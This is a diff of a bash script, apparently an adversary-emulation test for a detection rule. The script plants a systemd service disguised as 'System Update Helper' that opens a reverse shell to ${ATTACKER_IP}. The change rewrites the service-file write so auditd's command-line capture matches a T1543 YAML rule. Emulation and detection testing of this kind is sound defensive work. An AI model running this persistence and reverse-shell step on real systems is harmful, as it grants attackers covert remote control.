@@ -10,19 +10,9 @@ SERVICE_NAME="siem-update"
 SERVICE_FILE="/etc/systemd/system/${SERVICE_NAME}.service"
 
 # --- Stage 1: T1543.002 — Plant systemd persistence ---
-cat > "$SERVICE_FILE" <<EOF
-[Unit]
-Description=System Update Helper
-After=network.target
-
-[Service]
-Type=oneshot
-ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/${ATTACKER_IP}/${ATTACKER_PORT} 0>&1'
-RemainAfterExit=no
-
-[Install]
-WantedBy=multi-user.target
-EOF
+# Written via bash -c so that "ExecStart=" appears in the process command_line
+# that auditd captures — required for the T1543 YAML rule to match.
+bash -c "printf '[Unit]\nDescription=System Update Helper\nAfter=network.target\n\n[Service]\nType=oneshot\nExecStart=/bin/bash -c \"bash -i >& /dev/tcp/${ATTACKER_IP}/${ATTACKER_PORT} 0>&1\"\nRemainAfterExit=no\n\n[Install]\nWantedBy=multi-user.target\n' > ${SERVICE_FILE}"
 
 systemctl daemon-reload
 systemctl enable "$SERVICE_NAME" 2>/dev/null
